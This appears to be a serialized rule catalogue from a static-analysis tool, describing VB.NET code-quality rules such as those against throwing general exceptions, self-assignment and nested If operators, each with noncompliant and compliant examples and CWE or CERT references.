vbnetS112)General exceptions should never be thrown"MAJOR*vbnet:¡<p>Throwing such general exceptions as <code>Exception</code>, <code>SystemException</code>, <code>ApplicationException</code>,
<code>IndexOutOfRangeException</code>, <code>NullReferenceException</code>, <code>OutOfMemoryException</code> and
<code>ExecutionEngineException</code> prevents calling methods from handling true, system-generated exceptions differently than application-generated
errors. </p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Sub DoSomething(obj As Object)
  If obj Is Nothing Then
    ' Noncompliant
    Throw New NullReferenceException("obj")
  End If
  ' ...
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Sub DoSomething(obj As Object)
  If obj Is Nothing Then
    Throw New ArgumentNullException("obj")
  End If
  ' ...
End Sub
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/397.html">MITRE, CWE-397</a> - Declaration of Throws for Generic Exception </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/BoB3AQ">CERT, ERR07-J.</a> - Do not throw RuntimeException, Exception, or Throwable
  </li>
</ul>Z
CODE_SMELL
ƒ
vbnet:S1656¥
vbnetS1656%Variables should not be self-assigned"MAJOR*vbnet:È<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake
and some other value or variable was intended for the assignment instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Sub SetName(name As String)
  name = name
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Sub SetName(name As String)
  Me.name = name
End Sub
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
 

vbnet:S103ª
vbnetS103Lines should not be too long"MAJOR*vbnet:t<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>Z
CODE_SMELL
‡

vbnet:S104—
vbnetS104,Files should not have too many lines of code"MAJOR*vbnet:˘<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>Z
CODE_SMELL
Ê

vbnet:S107◊
vbnetS107.Procedures should not have too many parameters"MAJOR*vbnet:˝<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the procedure is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 3 parameters:</p>
<pre>
Public Sub Foo(ByVal p1 As Integer, ByVal p2 As Integer, ByVal p3 As Integer, ByVal p4 As Integer) ' Noncompliant
  ' ...
End Sub

Public Function Bar(ByVal p1 As Integer, ByVal p2 As Integer, ByVal p3 As Integer, ByVal p4 As Integer) ' Noncompliant
  ' ...
End Function
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Sub Foo(ByVal p1 As Integer, ByVal p2 As Integer, ByVal p3 As Integer)
  ' ...
End Sub

Public Function Bar(ByVal p1 As Integer, ByVal p2 As Integer, ByVal p3 As Integer)
  ' ...
End Function
</pre>Z
CODE_SMELL
Ì

vbnet:S108ﬁ
vbnetS108.Nested blocks of code should not be left empty"MAJOR*vbnet:Ñ<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
' Empty on purpose or missing piece of code?
For index As Integer = 1 To 42 ' NonCompliant
Next
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>Z
CODE_SMELL
®
vbnet:S2357ò
vbnetS2357Fields should be private"MAJOR*vbnet:”<p>Fields should not be part of an API, and therefore should always be private. Indeed, they cannot be added to an interface for instance, and
validation cannot be added later on without breaking backward compatibility. Instead, developers should encapsulate their fields into properties.
Explicit property getters and setters can be introduced for validation purposes or to smooth the transition to a newer system.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Class Foo
    Public Foo = 42          ' Noncompliant
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Class Foo
    Public Property Foo = 42 ' Compliant
End Class
</pre>
<h2>Exceptions</h2>
<p><code>Shared</code> and <code>Const</code> fields are ignored.</p>Z
CODE_SMELL
é
vbnet:S2358˛
vbnetS23582"IsNot" should be used instead of "Not ... Is ...""MAJOR*vbnet:ü<p>The <code>... IsNot ...</code> syntax is more compact and more readable than the <code>Not ... Is ...</code> syntax.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Main()
        Dim a = Not "a" Is Nothing ' Noncompliant
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()
        Dim a = "a" IsNot Nothing  ' Compliant
    End Sub
End Module
</pre>Z
CODE_SMELL
é

vbnet:S1542˛	
vbnetS1542?Functions and procedures should comply with a naming convention"MAJOR*vbnet:í	<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all subroutine and function names match a provided regular
expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Pascal casing, starting with an upper case character, e.g. BackColor </li>
  <li> Short abbreviations of 2 letters can be capitalized, e.g. GetID </li>
  <li> Longer abbreviations need to be lower cased, e.g. GetHtml </li>
  <li> Event handlers with a handles clause and two-parameter methods with <code>EventArgs</code> second parameter are not covered by this rule. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code></p>
<pre>
Module Module1
  Sub bad_subroutine()                      ' Noncompliant
  End Sub

  Public Function Bad_Function() As Integer ' Noncompliant
    Return 42
  End Function
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
  Sub GoodSubroutine()                      ' Compliant
  End Sub

  Public Function GoodFunction() As Integer ' Compliant
    Return 42
  End Function
End Module
</pre>Z
CODE_SMELL
”
vbnet:S2234√
vbnetS22340Parameters should be passed in the correct order"MAJOR*vbnet:Ê<p>When the names of parameters in a procedure call match the names of the procedure arguments, it contributes to a clearer, more readable code.
However, when the names match but are passed in a different order than the method arguments, it indicates a mistake in the parameter order which will
likely lead to unexpected results.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Function Divide(ByVal divisor As Integer, ByVal dividend As Integer) As Double
    Return divisor / dividend
End Function

Public Sub DoTheThing()
    Dim divisor = 15
    Dim dividend = 5

    Dim result = Divide(dividend, divisor)  ' Noncompliant; operation succeeds, but result is unexpected
    '...
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Function Divide(ByVal divisor As Integer, ByVal dividend As Integer) As Double
    Return divisor / dividend
End Function

Public Sub DoTheThing()
    Dim divisor = 15
    Dim dividend = 5

    Dim result = Divide(divisor, dividend)
    '...
End Sub
</pre>Z
CODE_SMELL
⁄

vbnet:S1145 

vbnetS1145FUseless "if(true) {...}" and "if(false){...}" blocks should be removed"MAJOR*vbnet:ﬁ	<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
    If True Then ' Noncompliant
      DoSomething()
    End If

    If False Then ' Noncompliant
      DoSomethingElse()
    End If
</pre>
<h2>Compliant Solution</h2>
<pre>
DoSomething();
' ...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571.html">MITRE, CWE-571</a> - Expression is Always True </li>
</ul>ZBUG
˚

vbnet:S122Ï
vbnetS122&Statements should be on separate lines"MAJOR*vbnet:ö<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Main()
        Dim a = 0 : Dim b = 0  ' Noncompliant
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()
        Dim a = 0              ' Compliant
        Dim b = 0              ' Compliant
    End Sub
End Module
</pre>Z
CODE_SMELL
Ô
vbnet:S2352ﬂ
vbnetS2352BIndexed properties with more than one parameter should not be used"MAJOR*vbnet:<p>Indexed properties are meant to represent access to a logical collection. When multiple parameters are required, this design guideline may be
violated, and refactoring the property into a method is preferable.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    ReadOnly Property Sum(ByVal a As Integer, ByVal b As Integer) ' Noncompliant
        Get
            Return a + b
        End Get
    End Property
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Function Sum(ByVal a As Integer, ByVal b As Integer)          ' Compliant
        Return a + b
    End Function
End Module
</pre>Z
CODE_SMELL
ı
vbnet:S2757Â
vbnetS2757'"=+" should not be used instead of "+=""MAJOR*vbnet:ò<p>The use of operators pairs ( <code>=+</code> or <code>=-</code>) where the reversed, single operator was meant (<code>+=</code> or <code>-=</code>)
will compile and run, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code> or <code>=-</code> is used without any spacing between the two operators and when there is at least
one whitespace character after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Dim target As Integer = -5
Dim num As Integer = 3

target =- num ' Noncompliant; target = -3. Is that really what's meant?
target =+ num ' Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim target As Integer = -5
Dim num As Integer = 3

target = -num ' Compliant; intent to assign inverse value of num is clear
target += num
</pre>ZBUG
‘	
vbnet:S2359ƒ	
vbnetS2359("On Error" statements should not be used"MAJOR*vbnet:Ô<p>Prefer the use of <code>Try ... Catch</code> blocks instead of <code>On Error</code> statements.</p>
<p>Visual Basic .NET and Visual Basic 2005 offer structured exception handling that provides a powerful, more readable alternative to the <code>On
Error Goto</code> error handling from previous versions of Microsoft Visual Basic. Structured exception handling is more powerful because it allows
you to nest error handlers inside other error handlers within the same procedure. Furthermore, structured exception handling uses a block syntax
similar to the <code>If...Else...End If</code> statement. This makes Visual Basic .NET and Visual Basic 2005 code more readable and easier to
maintain.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Sub DivideByZero()
  On Error GoTo nextstep
  Dim result As Integer
  Dim num As Integer
  num = 100
  result = num / 0
nextstep:
  System.Console.WriteLine("Error")
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Sub DivideByZero()
  Try
    Dim result As Integer
    Dim num As Integer
    num = 100
    result = num / 0
  Catch
    System.Console.WriteLine("Error")
  End Try
End Sub
</pre>Z
CODE_SMELL
î
vbnet:S3603Ñ
vbnetS36033Methods with "Pure" attribute should return a value"MAJOR*vbnet:´<p>Marking a method with the <code>Pure</code> attribute specifies that the method doesn't make any visible changes; thus, the method should return a
result, otherwise the call to the method should be equal to no-operation. So <code>Pure</code> on a <code>void</code> method is either a mistake, or
the method doesn't do any meaningful task.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Class Person
    Private age As Integer

    &lt;Pure&gt; ' Noncompliant. In this case the method makes a possibly visible state change
    Private Sub ConfigureAge(ByVal age As Integer)
        ...
        Me.age = age
    End Sub
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Class Person
    Private age As Integer

    Private Sub ConfigureAge(ByVal age As Integer)
        Me.age = age
    End Sub
End Class
</pre>ZBUG
¸
vbnet:S1751Ï
vbnetS17515Loops with at most one iteration should be refactored"MAJOR*vbnet:ë<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. No developer
expects to find such a use of a loop statement. If the initial intention of the author was really to conditionally execute one piece of code, an
<code>if</code> statement should be used instead.</p>
<p>At worst that was not the initial intention of the author and so the body of the loop should be fixed to use the nested <code>return</code>,
<code>break</code> or <code>throw</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
For i As Integer = 0 To 10   'noncompliant, loop only executes once
  foo(i)
  Exit For
Next
...
For i As Integer = 0 To 10   'noncompliant, loop only executes once
  If i = Something
    Exit For
  Else
    foo(i)
    Return
  End If
Next
</pre>
<h2>Compliant Solution</h2>
<pre>
For i As Integer = 0 To 10
  foo(i)
Next
...
For i As Integer = 0 To 10
  If i = Something
    Exit For
  Else
    foo(i)
  End If
Next
</pre>ZBUG
©
vbnet:S1871ô
vbnetS1871WTwo branches in a conditional structure should not have exactly the same implementation"MAJOR*vbnet:ï<p>Having two <code>Cases</code> in the same <code>Select</code> statement or branches in the same <code>If</code> structure with the same
implementation is at best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an
<code>If</code> structure they should be combined, or for a <code>Select</code>, one should fall through to the other.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Select i
  Case 1
    DoFirst()
    DoSomething()
  Case 2
    DoSomethingDifferent()
  Case 3  ' Noncompliant; duplicates case 1's implementation
    DoFirst()
    DoSomething()
  Case Else:
    DoTheRest()
End Select

If a &gt;= 0 AndAlso a &lt; 10 Then
  DoFirst()
  DoTheThing()
ElseIf a &gt;= 10 AndAlso a &lt; 20 Then
  DoTheOtherThing()
ElseIf a &gt;= 20 AndAlso a &lt; 50   ' Noncompliant; duplicates first condition
  DoFirst()
  DoTheThing()
Else
  DoTheRest();
End If
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>If</code> chain or <code>Case</code> clause that contain a single line of code are ignored.</p>
<pre>
If a &gt;= 0 AndAlso a &lt; 10 Then
  DoTheThing()
ElseIf a &gt;= 10 AndAlso a &lt; 20 Then
  DoTheOtherThing()
ElseIf a &gt;= 20 AndAlso a &lt; 50   ' no issue, usually this is done on purpose to increase the readability
  DoTheThing()
End If
</pre>
<p>But this exception does not apply to <code>If</code> chains without <code>Else</code>-s, or to <code>Select</code>-s without <code>Case Else</code>
clauses when all branches have the same single line of code. In case of <code>If</code> chains with <code>Else</code>-s, or of <code>Select</code>-es
with <code>Case Else</code> clauses, rule <a href='/coding_rules#rule_key=vbnet%3AS3923'>S3923</a> raises a bug. </p>
<pre>
If a &gt;= 0 AndAlso a &lt; 10 Then
  DoTheThing()
ElseIf a &gt;= 10 AndAlso a &lt; 20 Then
  DoTheOtherThing()  ' Noncompliant, this might have been done on purpose but probably not
End If
</pre>Z
CODE_SMELL
 
vbnet:S1110∫
vbnetS11100Redundant pairs of parentheses should be removed"MAJOR*vbnet:›<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
If a AndAlso ((x + y &gt; 0)) Then ' Noncompliant
    ' ...
End If

Return ((x + 1))  ' Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
If a AndAlso x + y &gt; 0 Then
    ' ...
End If

Return (x + 1)
</pre>Z
CODE_SMELL
Í
vbnet:S1479⁄
vbnetS1479@"Select Case" statements should not have too many "Case" clauses"MAJOR*vbnet:Ì
<p>When <code>Select Case</code> statements have large sets of case clauses, it is usually an attempt to map two sets of data. A
<code>Dictionary</code> should be used instead to make the code more readable and maintainable.</p>
<h2>Noncompliant Code Example</h2>
<p>With a "Maximum number of case" set to 4</p>
<pre>
Public Class TooManyCase

    Public Function SelectCase(Ch As Char) As Integer
        Select Case Ch
            Case "a"c
                Return 1
            Case "b"c, "c"c
                Return 2
            Case "d"c
                Return 3
            Case "e"c
                Return 4
            Case "f"c, "g"c, "h"c
                Return 5
            Case Else
                Return 6
        End Select
    End Function

End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Class TooManyCase

    Private fMatching As New Dictionary(Of Char, Integer) From {
            {"a"c, 1}, {"b"c, 2}, {"c"c, 2}, {"d"c, 3},
            {"e"c, 4}, {"f"c, 5}, {"g"c, 5}, {"h"c, 5},
        }

    Public Function SelectCase(Ch As Char) As Integer
        Dim Value As Integer
        If fMatching.TryGetValue(Ch, Value) Then
            Return Value
        Else
            Return 6
        End If
    End Function

End Class
</pre>
<h2>Exceptions</h2>
<p>This rule ignores <code>Select Case</code>s over <code>Enum</code>s and empty, fall-through cases.</p>Z
CODE_SMELL
’	
vbnet:S1764≈	
vbnetS1764KIdentical expressions should not be used on both sides of a binary operator"MAJOR*vbnet:‘<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of most binary mathematical operators, having the same
value on both sides of an operator yields predictable results, and should be simplified.</p>
<p>This rule ignores <code>*</code>, <code>+</code>, <code>&amp;</code>, <code>&lt;&lt;</code>, and <code>&gt;&gt;</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
If (a = a) Then
  doZ()
End If

If a = b OrElse a = b Then
  doW()
End If

Dim j = 5 / 5
j = 5 \ 5
j = 5 Mod 5
Dim k = 5 - 5

Dim i = 42
i /= i
i -= i
</pre>
<h2>Exceptions</h2>
<p>This rule ignores <code>*</code>, <code>+</code>, and <code>=</code>. </p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href='/coding_rules#rule_key=vbnet%3AS1656'>S1656</a> - Implements a check on <code>=</code>. </li>
</ul>ZBUG
Ò
vbnet:S3385·
vbnetS3385$"Exit" statements should not be used"MAJOR*vbnet:ê<p>Other than <code>Exit Select</code>, using an <code>Exit</code> statement is never a good idea.</p>
<p><code>Exit Do</code>, <code>Exit For</code>, <code>Exit Try</code>, and <code>Exit While</code> will all result in unstructured control flow, i.e.
spaghetti code.</p>
<p><code>Exit Function</code>, <code>Exit Property</code>, and <code>Exit Sub</code> are all poor, less-readable substitutes for a simple
<code>return</code>, and if used with code that should return a value (<code>Exit Function</code> and in some cases <code>Exit Property</code>) they
could result in a <code>NullReferenceException</code>.</p>
<p>This rule raises an issue for all uses of <code>Exit</code> except <code>Exit Select</code> and <code>Exit Do</code> statements in loops without
condition.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Class Sample
  Dim condition As Boolean

  Public Sub MySub()
    If condition Then
      Exit Sub                  ' Noncompliant
    End If

    For index = 1 To 10
      If index = 5 Then
          Exit For               ' Noncompliant
      End If
      ' ...
    Next
  End Sub
  Function MyFunction() As Object
    ' ...
    MyFunction = 42
    Exit Function              ' Noncompliant
  End Function
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Class Sample
  Dim condition As Boolean

  Public Sub MySub()
    If condition Then
        Return
    End If

    For index = 1 To 4
        ' ...
    Next
  End Sub
  Function MyFunction() As Object
    ' ...
    Return 42
  End Function
End Class
</pre>Z
CODE_SMELL
‘
vbnet:S3358ƒ
vbnetS3358!If operators should not be nested"MAJOR*vbnet:ˆ<p>Just because you <em>can</em> do something, doesn't mean you should, and that's the case with nested ternary operations. Nesting ternary operators
results in the kind of code that may seem clear as day when you write it, but six months later will leave maintainers (or worse - future you)
scratching their heads and cursing.</p>
<p>Instead, err on the side of clarity, and use another line to express the nested operation as a separate statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Function GetTitle(ByVal p As Person) As String
    Return If(p.Gender = Gender.MALE, "Mr. ", If(p.IsMarried, "Mrs. ", "Miss ")) ' Noncompliant
End Function
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Function GetTitle(ByVal p As Person) As String
    If p.Gender = Gender.MALE Then
        Return "Mr. "
    End If

    Return If(p.IsMarried, "Mrs. ", "Miss ")
End Function
</pre>Z
CODE_SMELL
ä
vbnet:S3598˙
vbnetS3598BOne-way "OperationContract" methods should have "void" return type"MAJOR*vbnet:í<p>When declaring a Windows Communication Foundation (WCF) <code>OperationContract</code> method one-way, that service method won't return any result,
not even an underlying empty confirmation message. These are fire-and-forget methods that are useful in event-like communication. Specifying a return
type therefore does not make sense.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;ServiceContract&gt;
Interface IMyService
    &lt;OperationContract(IsOneWay:=True)&gt;
    Function SomethingHappened(ByVal parameter As Integer) As Integer ' Noncompliant
End Interface
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;ServiceContract&gt;
Interface IMyService
    &lt;OperationContract(IsOneWay:=True)&gt;
    Sub SomethingHappened(ByVal parameter As Integer)
End Interface
</pre>
<h2>Exceptions</h2>
<p>The rule doesn't report if <code>OperationContractAttribute.AsyncPattern</code> is set to <code>true</code>.</p>ZBUG
È
vbnet:S1172Ÿ
vbnetS1172-Unused procedure parameters should be removed"MAJOR*vbnet:ˇ
<p>Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will be the same.</p>
<p>This rule raises an issue when a <code>private</code> procedure of a <code>Class</code>, <code>Module</code> or <code>Structure</code> takes a
parameter without using it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Private Sub DoSomething(ByVal a As Integer, ByVal b as Integer) ' "b" is unused
    Compute(a)
End Sub

Private Function DoSomething2(ByVal a As Integer, ByVal b As Integer) As Integer ' "a" is unused
    Compute(b)
    Return b
End Function
</pre>
<h2>Compliant Solution</h2>
<pre>
Private Sub DoSomething(ByVal a As Integer)
    Compute(a)
End Sub

Private Function DoSomething2(ByVal b As Integer) As Integer
    Compute(b)
    Return b
End Function
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise any issue in the following contexts:</p>
<ul>
  <li> Procedures decorated with attributes. </li>
  <li> Empty procedures. </li>
  <li> Procedures which only throw <code>NotImplementedException</code>. </li>
  <li> Main methods. </li>
  <li> <code>virtual</code>, <code>override</code> procedures. </li>
  <li> Interface implementations. </li>
  <li> Event handlers. </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>Z
CODE_SMELL
ë	
vbnet:S1862Å	
vbnetS1862ARelated "If/ElseIf" statements should not have the same condition"MAJOR*vbnet:ö<p>A chain of <code>If</code>/<code>ElseIf</code> statements is evaluated from top to bottom. At most, only one branch will be executed: the first one
with a condition that evaluates to <code>True</code>.</p>
<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and
at worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior.</p>
<h2>Noncompliant Code Example</h2>
<pre>
If param = 1 Then
  OpenWindow()
ElseIf param = 2 Then
  CloseWindow()
ElseIf param = 1 Then ' Noncompliant
  MoveWindowToTheBackground()
End If
</pre>
<h2>Compliant Solution</h2>
<pre>
If param = 1 Then
  OpenWindow()
ElseIf param = 2 Then
  CloseWindow()
ElseIf param = 3 Then
  MoveWindowToTheBackground()
End If
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
©
vbnet:S1066ô
vbnetS1066,Collapsible "if" statements should be merged"MAJOR*vbnet:¿<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
If condition1 Then
    If condition2 Then ' Noncompliant
        ' ...
    End If
End If
</pre>
<h2>Compliant Solution</h2>
<pre>
If condition1 AndAlso condition2 Then
    ' ...
End If
</pre>Z
CODE_SMELL
Â
vbnet:S4210’
vbnetS4210:Windows Forms entry points should be marked with STAThread"MAJOR*vbnet:ı<p>When an assembly uses Windows Forms (classes and interfaces from the <code>System.Windows.Forms</code> namespace) its entry point should be marked
with the <code>STAThreadAttribute</code> to indicate that the threading model should be "Single-Threaded Apartment" (STA) which is the only one
supported by Windows Forms.</p>
<p>This rule raises an issue when the entry point (<code>Shared Sub Main</code> method) of an assembly using Windows Forms is not marked as STA.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Imports System.Windows.Forms

Public Class Foo
  Shared Sub Main()
    Dim winForm As Form = New Form
    Application.Run(winForm)
  End Sub
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Imports System.Windows.Forms

Public Class Foo
  &lt;STAThread()&gt; Shared Sub Main()
    Dim winForm As Form = New Form
    Application.Run(winForm)
  End Sub
End Class
</pre>ZBUG
≠
vbnet:S3923ù
vbnetS3923WAll branches in a conditional structure should not have exactly the same implementation"MAJOR*vbnet:†<p>Having all branches in a <code>Select Case</code> or <code>If</code> chain with the same implementation is an error. Either a copy-paste error was
made and something different should be executed, or there shouldn't be a <code>Select Case</code> / <code>If</code> chain at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Dim b As Integer = If(a &gt; 12, 4, 4)

If b = 0 Then
    DoTheThing()
Else
    DoTheThing()
End If

Select Case i
    Case 1
        DoSomething()
    Case 2
        DoSomething()
    Case 3
        DoSomething()
    Case Else
        DoSomething()
End Select
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>If</code> chains without <code>Else</code>-s, or to <code>Select Case</code>-es without <code>Case Else</code>
clauses.</p>
<pre>
If b = 0 Then ' No issue, this could have been done on purpose to make the code more readable
    DoTheThing()
ElseIf
    DoTheThing()
End If
</pre>ZBUG
ö
vbnet:S3926ä
vbnetS3926FDeserialization methods should be provided for "OptionalField" members"MAJOR*vbnet:û
<p>Fields marked with <code>System.Runtime.Serialization.OptionalFieldAttribute</code> are serialized just like any other field. But such fields are
ignored on deserialization, and retain the default values associated with their types. Therefore, deserialization event handlers should be declared to
set such fields during the deserialization process.</p>
<p>This rule raises when at least one field with the <code>System.Runtime.Serialization.OptionalFieldAttribute</code> attribute is declared but one
(or both) of the following event handlers <code>System.Runtime.Serialization.OnDeserializingAttribute</code> or
<code>System.Runtime.Serialization.OnDeserializedAttribute</code> are not present.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;Serializable&gt;
Public Class Foo ' Noncompliant
    &lt;OptionalField(VersionAdded:=2)&gt;
    Private optionalField As Integer = 5
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;Serializable&gt;
Public Class Foo
    &lt;OptionalField(VersionAdded:=2)&gt;
    Private optionalField As Integer = 5

    &lt;OnDeserializing&gt;
    Private Sub OnDeserializing(ByVal context As StreamingContext)
        optionalField = 5
    End Sub

    &lt;OnDeserialized&gt;
    Private Sub OnDeserialized(ByVal context As StreamingContext)
    End Sub
End Class
</pre>ZBUG
Ï
vbnet:S3927‹
vbnetS3927<Serialization event handlers should be implemented correctly"MAJOR*vbnet:˙<p>Serialization event handlers that don't have the correct signature will simply not be called, thus bypassing any attempts to augment the automated
de/serialization.</p>
<p>This rule raises issue when a method marked with one of the following attributes is not <code>private</code>, does not return <code>void</code>,
has type parameters, or does not have a single parameter of type <code>System.Runtime.Serialization.StreamingContext</code>:</p>
<ul>
  <li> <code>System.Runtime.Serialization.OnSerializingAttribute</code> </li>
  <li> <code>System.Runtime.Serialization.OnSerializedAttribute</code> </li>
  <li> <code>System.Runtime.Serialization.OnDeserializingAttribute</code> </li>
  <li> <code>System.Runtime.Serialization.OnDeserializedAttribute</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;Serializable&gt;
Public Class Foo
    &lt;OnSerializing&gt;
    Public Sub OnSerializing(ByVal context As StreamingContext) ' Noncompliant should be private
    End Sub

    &lt;OnSerialized&gt;
    Private Function OnSerialized(ByVal context As StreamingContext) As Integer '  Noncompliant should return void
    End Function

    &lt;OnDeserializing&gt;
    Private Sub OnDeserializing() ' Noncompliant should have a single parameter of type StreamingContext
    End Sub

    &lt;OnSerializing&gt;
    Public Sub OnSerializing2(Of T)(ByVal context As StreamingContext) ' Noncompliant should have no type parameters
    End Sub

    &lt;OnDeserialized&gt;
    Private Sub OnDeserialized(ByVal context As StreamingContext, ByVal str As String) ' Noncompliant should have a single parameter of type StreamingContext
    End Sub
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;Serializable&gt;
Public Class Foo
    &lt;OnSerializing&gt;
    Private Sub OnSerializing(ByVal context As StreamingContext)
    End Sub

    &lt;OnSerialized&gt;
    Private Sub OnSerialized(ByVal context As StreamingContext)
    End Sub

    &lt;OnDeserializing&gt;
    Private Sub OnDeserializing(ByVal context As StreamingContext)
    End Sub

    &lt;OnDeserialized&gt;
    Private Sub OnDeserialized(ByVal context As StreamingContext)
    End Sub
End Class
</pre>ZBUG
œ
vbnet:S3453ø
vbnetS34533Classes should not have only "private" constructors"MAJOR*vbnet:Ê<p>A class with only <code>private</code> constructors can't be instantiated, thus, it seems to be pointless code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Class [MyClass]
    Private Sub New() // Noncompliant
        ' ...
    End Sub
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Class [MyClass]
    Private Sub New()
        ' ...
    End Sub
End Class
</pre>
<h2>Exceptions</h2>
<p>Classes that themselves access their private constructors (singletons or smart enums) are ignored. Classes with only <code>static</code> members
are also ignored because they are covered by Rule S1118.</p>ZBUG
è
vbnet:S2761ˇ
vbnetS2761-'Not' boolean operator should not be repeated"MAJOR*vbnet:¨<p>Calling the <code>Not</code> operator twice does nothing: the second invocation undoes the first. Either this is a bug, if the operator was
actually meant to be called once, or misleading if done on purpose.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Dim b As Boolean = False
Dim c As Boolean = Not Not b 'Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim b As Boolean = False
Dim c As Boolean = b 'Compliant
</pre>ZBUG
¡
vbnet:S4144±
